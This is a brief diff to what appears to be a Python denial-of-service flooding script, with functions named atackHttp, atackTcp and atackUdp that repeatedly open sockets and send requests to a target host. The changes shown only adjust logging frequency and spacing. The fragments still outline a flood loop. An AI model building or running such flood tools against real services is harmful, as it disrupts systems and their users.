@@ -94,6 +94,7 @@ def atackHttp():
 
 		req += 1
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		
 		try:
 			sock.connect((host, port))
 			sock.send(request.encode())
@@ -124,7 +125,7 @@ def atackTcp():
 		finally:
 			sock.close()
 
-		if req % 100 == 1:
+		if req % 100 == 0:
 			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
 
 def atackUdp():
@@ -146,7 +147,7 @@ def atackUdp():
 		finally:
 			sock.close()
 
-		if req % 100 == 1:
+		if req % 100 == 0:
 			print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
 
 alltypes = ['udp','tcp','http','1','2','3']
